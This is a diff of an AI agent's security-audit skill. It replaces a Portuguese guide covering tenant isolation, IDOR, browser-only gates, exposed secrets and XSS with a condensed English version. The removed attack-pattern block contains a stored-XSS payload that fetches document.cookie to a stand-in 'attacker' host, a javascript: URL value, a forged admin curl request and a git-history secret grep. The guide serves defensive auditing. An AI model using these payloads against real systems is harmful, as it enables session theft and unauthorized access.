@@ -11,229 +11,73 @@ metadata:
 
 ## Objective
 
-Ensinar o agente a executar uma auditoria de segurança **adaptativa à stack**: detectar
-primeiro qual é a stack do projeto (linguagem, framework, ORM/query builder, mecanismo
-de auth, frontend, arquivos de deploy), mapear cinco classes canônicas de falha para os
-equivalentes reais dessa stack e percorrer o código **sistematicamente, arquivo por
-arquivo, handler por handler**, reportando apenas achados verificados com evidência
-`arquivo:linha`.
-
-As cinco classes (stack-independentes em intenção, dependentes em tradução):
-
-```text
-1. BANCO SEM TRAVA      — isolamento de tenant/dono ausente ou furado
-2. PERMISSÃO NO NAVIGADOR — gate de papel só no frontend, sem checagem server-side
-3. IDOR                 — objeto referenciado por ID sem verificação de posse
-4. CHAVES EXPOSTAS      — segredos hardcoded, defaults públicos, histórico git
-5. INPUTS SEM TRATAMENTO — XSS / injeção de HTML por input não sanitizado
-```
+Perform a stack-adaptive, evidence-driven codebase security audit across five baseline failure classes: tenant/owner isolation, browser-only privilege gates, IDOR, exposed secrets, and unsafe HTML/input sinks. Measure coverage and report only verified findings.
 
 ## When to Use
 
-* Pedido explícito de auditoria de segurança de um repositório, código ou serviço.
-* Antes de lançar/deployar um sistema que lida com dados de múltiplos usuários ou tenants.
-* Quando a tarefa menciona "security audit", "find vulnerabilities", "penetration",
-  "hardcoded secrets", "IDOR", "XSS", "tenant isolation", "audit this codebase".
-* **Não** para uma única classe isolada: use a skill especializada (`authorization-audit`
-  para authz/IDOR em profundidade, `input-trust-audit` para confiança de input,
-  `api-abuse-audit` para endpoints como superfície diretamente acessível,
-  `data-integrity-audit` para constraints no banco).
-* **Composição:** esta skill é o **guarda-chuva** que produz o relatório final; as
-  especializadas aprofundam cada categoria. Pareia com `adversarial-review` (testar
-  bypass/repetição dos achados) e `error-flow-audit` (meios de caminho: o que acontece
-  quando a checagem falha no meio).
+Use for a broad security review of a repository or service, especially before deployment or when it handles multiple users or tenants. Do not invoke the full sweep for a request limited to one known class; use `authorization-audit`, `input-trust-audit`, `api-abuse-audit`, or `data-integrity-audit` directly.
+
+This is an umbrella and consolidation skill. Specialists deepen candidates; `adversarial-review` probes bypass and repetition; `error-flow-audit` covers partial failures. Do not duplicate a root cause across categories or specialist outputs.
 
 ## Mental Model
 
-A auditoria é um pipeline de **tradução → varredura → verificação → consolidação**:
+Run a translation-and-verification pipeline:
 
 ```text
-DETECT STACK  →  MAP CATEGORIES  →  SWEEP SYSTEMATICALLY  →  VERIFY  →  REPORT
- (o que é?)      (classe →           (todos os handlers,       (evidência,   (achados +
-                   equivalente          TODOS, não               não          pontos fortes +
-                   real da stack)       amostras)                hipótese)    issues)
+detect stack → map invariants to stack controls → enumerate coverage → verify candidates → consolidate
 ```
 
-Três princípios governam o modelo:
-
-1. **A classe é o invariant; a stack é a tradução.** "Toda query de leitura filtra pelo
-   tenant?" é o invariant. Em Supabase vira "RLS habilitada em toda tabela?"; em API
-   própria vira "todo SELECT de listagem/relatório/exportação tem WHERE org_id =
-   session.org?"; em ORM com middleware vira "o scope default está aplicado?". Identificar
-   **qual é o mecanismo de isolamento do projeto** antes de procurar ausência dele.
-
-2. **O frontend é sugestão, não fonte de verdade.** Todo gate de UI (`isAdmin`,
-   `canEdit`, role-based rendering) é um *indicador* de que existe uma operação
-   privilegiada — e portanto um *endereço* para cruzar com o endpoint correspondente.
-   A pergunta nunca é "a UI esconde?", é "o servidor rejeita?".
-
-3. **Cobertura é mensurável.** Uma auditoria sem lista do que foi verificado e está
-   correto não distingue "não achei" de "não procurei". A seção de pontos fortes é
-   prova de cobertura, não gentileza.
-
-Segredos seguem uma regra própria: **default público que não falha no startup é segredo
-vazado por design** (`${VAR:-changeme}` em produção sem validação de startup).
+The five classes are invariants, not search strings. Translate isolation into the project's actual RLS, scoped repository, middleware, or query model. Treat frontend gates as pointers to privileged server operations, never as controls. Coverage must distinguish “checked and protected” from “not inspected.” A public key is not a secret; classify exposure by capability and deployment context.
 
 ## Investigation Procedure
 
-1. **Detectar a stack.** Ler `package.json` / `go.mod` / `requirements.txt` /
-   `Gemfile` / `pom.xml`; identificar framework web, ORM/query builder, mecanismo de
-   auth (session, JWT, Supabase/Auth0/Clerk), frontend (React/Vue/Svelte/template
-   engine), e arquivos de deploy (Dockerfile, docker-compose, Helm, Terraform, CI).
-   Registrar a detecção — ela vai para a nota metodológica do relatório.
-
-2. **Mapear as cinco categorias para a stack.** Para cada classe, escrever o equivalente
-   concreto. Exemplo: projeto sem frontend → categoria 5 vira N/A explícito (backend só
-   renderiza HTML em e-mails? então o alvo é o template de e-mail). **Nunca forçar
-   achado em categoria inaplicável; declarar N/A com justificativa.**
-
-3. **Categoria 1 — isolamento.** Localizar o mecanismo de isolamento (RLS policies,
-   middleware de tenant, filtro manual por `user_id`/`org_id`). Listar TODAS as tabelas/
-   collections/índices e cruzar com onde o filtro existe. Foco especial em queries de
-   agregação, relatório, busca e exportação — as que mais esquecem o filtro.
-
-4. **Categoria 2 — gate no navegador.** Grep dos gates de papel no frontend
-   (`isAdmin`, `role ===`, `can(`, `hasPermission`). Para cada gate, localizar o endpoint
-   que a UI chama e abrir o handler: o servidor valida o privilégio? Cruzar um por um.
-
-5. **Categoria 3 — IDOR.** Enumerar TODOS os handlers de rota do backend (roteador por
-   roteador, não amostra). Para cada um que aceita ID (path, query ou body) de objeto
-   pertencente, verificar checagem de posse/tenant. Registrar handler por handler na
-   planilha de cobertura.
-
-6. **Categoria 4 — segredos.** Varredura em quatro camadas: (a) código/config/scripts/
-   docs por chaves, tokens, senhas, segredos de assinatura, credenciais padrão; (b)
-   deploy files (docker-compose, Helm values, CI env) por defaults `${VAR:-publico}` e
-   ausência de validação de startup que rejeite o default; (c) histórico git
-   (`git log --all -p` com padrões de segredo) por segredos commitados e removidos
-   depois — continuam válidos se não rotacionados; (d) bundle do frontend por chaves
-   embutidas (uma chave publicada é pública por definição — classificar pelo tipo, não
-   pelo medo).
-
-7. **Categoria 5 — input não tratado.** No frontend: sinks de HTML
-   (`innerHTML`, `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`), render de
-   markdown/HTML sem sanitização, URLs controladas por usuário em `href`/`src`
-   (`javascript:`), `eval`/`new Function`. Verificar se existe lib de sanitização no
-   projeto e se ela é aplicada **em cada ponto encontrado**. No backend: input do usuário
-   entrando em HTML de e-mail, templates ou respostas sem escape.
-
-8. **Verificar cada candidato.** Para cada achado: reproduzir (PoC local, request, teste)
-   ou apontar o mecanismo exato com `arquivo:linha` + trecho. Classificar confiança pela
-   escala do AGENTS.md § 2. Registrar **condições de explorabilidade** (feature flag,
-   config insegura, scope global) — um bug que exige config insegura é achado com
-   condição, não achado cancelado.
-
-9. **Consolidar pontos fortes.** Para cada rota/tabela/gate verificado sem defeito,
-   registrar a evidência da proteção ("router X valida posse em todos os N handlers").
-
-10. **Reportar.** Findings via `templates/audit-report.md`, agrupados por categoria,
-    ordenados por severidade; recomendações priorizadas P1/P2/P3; e — quando o pedido
-    incluir relatório — gerar o documento final (tabela de achados, gráfico por
-    severidade, seção de issues prontas para o tracker).
+1. Detect language, framework, routing, ORM/query layer, authentication, frontend/rendering, deployment, background jobs, and trust boundaries from manifests and code.
+2. Bound scope and create inventories of routes/operations, protected resources/tables, frontend privilege gates, configuration/deploy files, and unsafe rendering sinks. Declare explicit N/A categories.
+3. **Isolation:** identify the authoritative tenant/owner mechanism and inspect every relevant read/write, emphasizing list, aggregate, search, report, and export paths.
+4. **Browser-only gates:** map every frontend role/permission gate to its server operation and verify server-side enforcement.
+5. **IDOR:** inspect every operation accepting an owned-resource identifier, including nested, batch, preview, attachment, and alternate-version paths.
+6. **Secrets:** scan source, configuration, deployment, CI, artifacts, and—when authorized and proportionate—git history. Determine whether each value is real, privileged, deployed, and rotated. Check unsafe production defaults and startup validation.
+7. **Unsafe input/HTML:** enumerate raw HTML/markdown/template/URL/code sinks and trace user-controlled data plus contextual escaping, sanitization, or scheme allowlists.
+8. Reproduce candidates safely or trace the exact reachable mechanism. Record exploitability conditions and compensating controls.
+9. Consolidate shared causes, recalculate confidence from all evidence, record strengths and coverage gaps, and prioritize remediation.
 
 ## Questions to Ask
 
-* Qual é o mecanismo de isolamento DESTE projeto? Onde cada query de leitura o aplica?
-* Este handler de listagem/relatório/exporta filtrou pelo tenant ou só "parece" filtrar?
-* Para cada gate de papel no frontend: qual endpoint ele chama? O endpoint rejeita sem a UI?
-* Este ID no path/query/body pertence a alguém? O handler sabe?
-* Este `${VAR:-default}` é segredo real se o deploy esquecer a env? O startup valida?
-* O que está no histórico git que foi "removido" mas nunca rotacionado?
-* Este markdown/HTML vindo do usuário passou por sanitização — ou só por um lib instalado?
-* A categoria faz sentido para esta stack, ou estou forçando achado? (N/A explícito)
-* Se eu souber apenas o ID de um recurso alheio, o que consigo ler/editar/deletar?
-* O que esta auditoria provou que está correto? (cobertura)
+* What stack-specific mechanism enforces tenant and owner isolation?
+* Do all list, aggregate, report, search, export, and background paths apply it?
+* Which server operation corresponds to each browser privilege gate?
+* Does every resource ID resolve within the caller's authorized scope?
+* Are alternate verbs, nested resources, files, batch operations, and versions protected equally?
+* Is an exposed value secret, publishable, placeholder, invalid, or already rotated—and what capability does it grant?
+* Can deployment fall back to a known secret without failing startup?
+* Which user-controlled values reach raw HTML, markdown, URL, template, or code sinks, and what context-aware control applies?
+* What was verified as protected, and what remains uninspected?
 
 ## Attack Patterns
 
 ```text
-agregação sem filtro — categoria 1
-    GET /api/stats/total-orders          → conta pedidos de TODOS os tenants
-    (o handler de listagem filtra org_id; o de agregação esqueceu)
-
-exportação esquecida — categoria 1
-    GET /api/reports/export.csv          → sem WHERE tenant → dump completo
-
-gate decorativo — categoria 2
-    frontend: {isAdmin && <AdminPanel/>}
-    curl -X POST /api/admin/users -b cookie_de_usuario_comum   → 200
-
-IDOR por verb alternativo — categoria 3
-    GET /api/documents/123   (checa posse)
-    GET /api/documents/123/preview   (esqueceu)          → lê alheio
-    DELETE bloqueado; PATCH {archived:true} liberado     → destrói alheio
-
-default que vira segredo — categoria 4
-    docker-compose: JWT_SECRET=${JWT_SECRET:-dev-secret}
-    deploy sem env → token forjável com segredo público do repo
-    (sem startup check que recuse o default = vulnerável por design)
-
-segredo fantasma — categoria 4
-    git log --all -p | grep AWS_SECRET   → removido no commit 7,
-    chave nunca rotacionada → ainda válida no bundle publicado
-
-markdown não sanitizado — categoria 5
-    comentário: <img src=x onerror="fetch(attacker/?c="+document.cookie)">
-    render via v-html / dangerouslySetInnerHTML sem DOMPurify → XSS stored
-
-href controlado — categoria 5
-    perfil.link = "javascript:alert(1)"  → <a href={{link}}> sem scheme allowlist
+isolation:      omit tenant predicate from aggregate/export/background query
+browser gate:   hide admin action in UI → invoke server endpoint as ordinary user
+IDOR:           replace owned ID with another actor's across verbs and subresources
+secret default: deploy without env → known repository default signs/authenticates
+history secret: removed credential remains valid because it was never rotated
+stored XSS:     user HTML/markdown reaches raw rendering without sanitization
+URL injection:  javascript: or unsafe scheme reaches user-controlled href/src
+control parity: primary route protected; batch/preview/legacy route omitted
 ```
 
 ## Evidence Requirements
 
-* Todo achado: `arquivo:linha` + trecho do código real + por que é explorável +
-  severidade (crítica/alta/média/baixa/informativa) + condições de explorabilidade.
-* **Nada de especulação reportada como bug.** Escala do AGENTS.md § 2:
-  * `CONFIRMED` — reproduzido (PoC, request, teste) com resultado observado.
-  * `HIGH CONFIDENCE` — mecanismo exato + evidência estrutural localizada, sem reprodução.
-  * `POSSIBLE` — mecanismo ou evidência incompletos; investigar mais antes de reportar.
-  * `SPECULATIVE` — listar apenas como risco a verificar; nunca bloquear release com isto.
-* IDOR/authz: o padrão-ouro é dois atores — A acessa recurso de B e o servidor aceita.
-* Segredos: provar que o valor é usado (não exemplo de doc) e, se histórico git, o
-  commit exato + se foi rotacionado.
-* Cobertura: a planilha handler-por-handler (categoria 3) e tabela-por-tabela
-  (categoria 1) é evidência de varredura completa; sem ela, declarar escopo parcial.
+Every finding needs exact file/line provenance, reachable data/control flow, violated invariant, exploitability conditions, impact, and either observed reproduction or concrete structural evidence. IDOR ideally uses two actors. Secret findings must prove a real capability or unsafe deployed default, not pattern resemblance. XSS findings must trace controllable input to an executable sink without effective contextual protection.
+
+Use `CONFIRMED`, `HIGH CONFIDENCE`, `POSSIBLE`, and `SPECULATIVE` exactly as defined in `AGENTS.md`. Keep speculative risks separate and never block release on them. When inventories are incomplete, label coverage partial.
 
 ## False Positives
 
-* **Recurso público por design** — perfil público, post público: ausência de filtro de
-  dono é intenção, não defeito. Confirmar a intenção antes.
-* **Middleware/global cobre a rota** — o handler "sem checagem" pode estar protegido por
-  middleware no prefixo. Verificar que o middleware aplica à rota exata (verb incluído).
-* **Chave de publishable é pública** — `pk_live_…`, client IDs de OAuth, project ref do
-  Firebase: projetadas para o bundle. Reportar só se a permissão delas no servidor é
-  ampla demais (config mal feita), não pela exposição em si.
-* **Exemplo em doc/fixture** — `API_KEY=xxx` em README de exemplo não é segredo. Provar
-  uso real antes.
-* **Framework auto-escapa** — React `{value}`, Angular `{{ }}`, templates Jinja2 com
-  autoescape: não é XSS. O sink é apenas onde o escape foi contornado
-  (`dangerouslySetInnerHTML`, `|safe`, `v-html`).
-* **Sanitização no write, não no read** — pode ser estratégia válida (escape na entrada
-  centralizado). Verificar a estratégia, não exigir o padrão favorito.
-* **Categoria inaplicável à stack** — projeto sem frontend não tem "permissão no
-  navegador"; CLI sem banco não tem RLS. Declarar N/A é resultado correto, não lacuna.
-* **Segredo em env de CI referenciado por `secrets.*`** — referência não é valor.
+Verify inherited middleware, database policies, scoped repositories, public-resource intent, framework auto-escaping, write-time sanitization, URL allowlists, and deployment/gateway controls. Publishable keys, OAuth client IDs, placeholders, fixtures, and secret references are not exposed secrets by themselves. A raw sink is not exploitable without attacker control and missing effective sanitization. N/A is valid for an inapplicable category; absence of a local check is not absence of an effective shared control.
 
 ## Output Format
 
-Para cada achado, um finding via `templates/audit-report.md` com os campos obrigatórios
-(`affected_component`, `invariant`, `mechanism`, `state_transition`, `impact`,
-`severity`, `confidence`, `evidence[]` com `source` = `arquivo:linha`), agrupados pelas
-cinco categorias. Ordem de apresentação: crítica → baixa, IDOR e isolamento primeiro.
+Use `templates/audit-report.md` for each consolidated finding, including `affected_component`, `invariant`, `mechanism`, `state_transition`, impact, severity, confidence, and `evidence[]` with file/line sources. Group by the five classes and order by severity, with isolation and IDOR first when severity ties.
 
-O relatório final deve conter:
-
-```text
-capa + nota metodológica (stack detectada → tradução das categorias)
-resumo executivo (contagem por severidade; por categoria)
-pontos fortes (o que foi verificado e está protegido, com evidência)
-tabela de achados (Severidade | Arquivo:linha | Descrição)
-recomendações priorizadas (P1, P2, P3…)
-issues para o tracker — texto completo por achado acionável
-  (título, labels, evidência, impacto, correção sugerida, critérios de aceite),
-  agrupando achados triviais do mesmo tema em issue única para não gerar spam
-```
-
-Findings consolidados passam por `scripts/findings.py` quando múltiplas skills
-contribuíram (dedup + recálculo de confiança pela evidência agregada).
+The final report must include stack/scope methodology, executive summary, evidence-backed strengths, findings table, coverage inventories and gaps, prioritized P1/P2/P3 recommendations, and tracker-ready issues with acceptance criteria. Group trivial findings sharing one cause. When multiple skills contribute, run `scripts/findings.py` for deduplication and confidence recalculation.
